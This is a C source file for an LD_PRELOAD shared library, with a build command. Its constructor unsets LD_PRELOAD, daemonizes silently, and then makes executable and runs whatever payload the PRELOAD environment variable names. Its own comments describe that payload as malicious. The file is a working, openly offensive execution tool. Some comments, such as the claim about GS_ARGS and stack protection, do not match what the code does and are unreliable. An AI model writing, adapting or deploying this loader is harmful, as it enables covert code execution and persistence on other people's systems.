/**
 * gcc preload.c -fPIC -shared -nostartfiles -m{arch} -s -o preload.so
 */
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

/**
 * @brief Executes a malicious payload by changing its permissions and running it using the system function.
 *
 * @details The pwn function retrieves the value of the "PRELOAD" environment variable.
 * It then changes the permissions of the file specified by the PRELOAD environment variable to 0755 (read, write, and execute for the owner, and read and execute for group and others).
 * Finally, it executes the payload using the system function.
 *
 * @return This function does not return a value.
 */
void pwn(void)
{
    const char *payload = getenv("PRELOAD");
    chmod(payload, 0755);
    system(payload);
}

/**
 * @brief Daemonizes the process by forking twice and closing file descriptors.
 *
 * This function is used to create a daemon process that runs in the background.
 * It performs the following steps:
 * 1. Forks the process and terminates the parent process.
 * 2. Creates a new session for the child process.
 * 3. Closes all open file descriptors.
 * 4. Redirects standard output and standard error to /dev/null.
 *
 * @return This function does not return a value.
 */
void daemonize(void)
{
    pid_t pid;

    pid = fork();
    if (pid < 0)
    {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    else if (pid > 0)
    {
        exit(EXIT_SUCCESS);
    }

    if (setsid() < 0)
    {
        perror("setsid");
        exit(EXIT_FAILURE);
    }

    for (int i = 0; i < sysconf(_SC_OPEN_MAX); ++i)
    {
        close(i);
    }

    freopen("/dev/null", "w", stdout);
    freopen("/dev/null", "w", stderr);
}

/**
 * @brief This function is a constructor that is executed before the main function starts.
 * It serves as a preload mechanism for a malicious payload.
 *
 * @details The preloadme function performs the following tasks:
 * 1. Unsets the LD_PRELOAD environment variable to prevent other preload libraries from interfering.
 * 2. Daemonizes the process by forking twice and closing file descriptors.
 * 3. Executes the malicious payload by changing its permissions and running it using the system function.
 * 4. Unsets the GS_ARGS environment variable to prevent stack protection from being bypassed.
 *
 * @return This function does not return a value.
 */
__attribute__((__constructor__)) void preloadme(void)
{
    unsetenv("LD_PRELOAD");
    daemonize();
    pwn();
    unsetenv("GS_ARGS");
}